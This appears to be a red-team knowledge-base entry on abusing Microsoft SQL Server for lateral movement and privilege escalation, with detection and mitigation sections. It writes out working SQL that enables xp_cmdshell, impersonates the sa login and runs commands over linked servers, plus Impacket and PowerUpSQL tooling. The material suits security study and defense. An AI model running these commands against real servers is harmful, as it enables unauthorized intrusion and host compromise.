---
title: MSSQL Abuse
aliases: ["SQL Server abuse", "xp_cmdshell", "Linked servers", "MSSQL impersonation"]
type: technique
domain: [red-team]
attack_tactic: [lateral-movement, privesc, credential-access]
tags: [type/technique, domain/red-team, attack/lateral-movement]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Service Principal Name (SPN)]]", "[[Kerberoasting]]", "[[Privileges and Rights]]", "[[Remote Execution & Lateral Movement (Windows)]]"]
created: 2026-06-06
updated: 2026-06-06
---

# MSSQL Abuse

> [!summary] One-liner
> SQL Server can execute OS commands, impersonate logins, and pivot across linked servers — turning DB access into host/domain compromise.

## Concept abused
A reachable MSSQL instance (often runs as a service account; discoverable via its `MSSQLSvc` [[Service Principal Name (SPN)|SPN]] → also a [[Kerberoasting]] target) exposes several abuse primitives.

## Primitives
| Feature | Abuse |
|---|---|
| **xp_cmdshell** | Run OS commands as the SQL service account (often high-priv / SYSTEM with [[Privileges and Rights|SeImpersonate]] → SYSTEM) |
| **Linked servers** | Chain to other SQL instances with stored creds → lateral movement, often re-enabling xp_cmdshell remotely |
| **Impersonation (`EXECUTE AS`)** | Switch login context to a higher-priv DB user (sysadmin) |

## Commands & tools
```sql
-- enable + run OS commands
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- impersonate a sysadmin
EXECUTE AS LOGIN = 'sa';

-- linked server command exec
EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSRV];
```
```bash
# Tooling
mssqlclient.py contoso.local/user:pass@10.0.0.5 -windows-auth   # Impacket
# PowerUpSQL: Get-SQLInstanceDomain, Invoke-SQLOSCmd, Get-SQLServerLinkCrawl
```

## Detection / artifacts
xp_cmdshell enablement, unusual `EXECUTE AS`, linked-server queries, SQL service spawning cmd/powershell.

## Mitigation
Disable xp_cmdshell, least-priv SQL service account (no SeImpersonate where avoidable), restrict linked-server creds, network-segment DB servers.

## Related
- The SQL service account is a [[Kerberoasting]] target; OS exec feeds [[Remote Execution & Lateral Movement (Windows)]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Microsoft extras → SQL Server"
